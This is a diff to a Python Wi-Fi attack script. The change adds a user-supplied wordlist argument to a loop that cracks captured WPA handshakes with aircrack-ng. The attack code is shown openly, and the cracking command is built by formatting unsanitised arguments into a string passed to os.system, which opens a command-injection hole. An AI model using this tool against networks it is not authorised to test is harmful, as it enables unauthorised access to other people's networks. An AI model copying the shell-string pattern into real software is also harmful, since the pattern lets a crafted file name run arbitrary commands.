@@ -7,13 +7,6 @@ from time import sleep
 from glob import glob
 import subprocess
 
-try:
-	iface = argv[1]
-	packet_count = int(argv[2])
-except:
-	print(argv[0],'<iface> <packet_count>')
-	exit()
-
 SUCCESS = '\033[92m'
 INFO    = '\033[94m'
 END     = '\033[0m'
@@ -21,7 +14,22 @@ WARNING = '\033[93m'
 FAIL    = '\033[91m'
 
 targets = []
-scan = True
+scan    = True
+
+try:
+	iface = argv[1]
+	packet_count = int(argv[2])
+	wordlist     = argv[3]
+except:
+	print(argv[0],'<iface> <packet_count> <wordlist>')
+	exit(-1)
+
+try:
+	open(wordlist,'r')
+except:
+        print(FAIL+'[-]Could not open wordlist'+END)
+        exit(-1)
+
 
 def channel_change():
 	global scan
@@ -100,7 +108,7 @@ print(SUCCESS+'[+]Captured {} valid handshakes'.format(len(valid_handshakes))+EN
 print(INFO+'[!]Cracking all valid handshakes...'+END)
 
 for h in valid_handshakes:
-	cmd = 'aircrack-ng -w ./wordlist {} > out'.format(h)
+	cmd = 'aircrack-ng -w {} {} > out'.format(wordlist,h)
 	print(cmd)
 	system(cmd)
 	results = open('out','r').read()
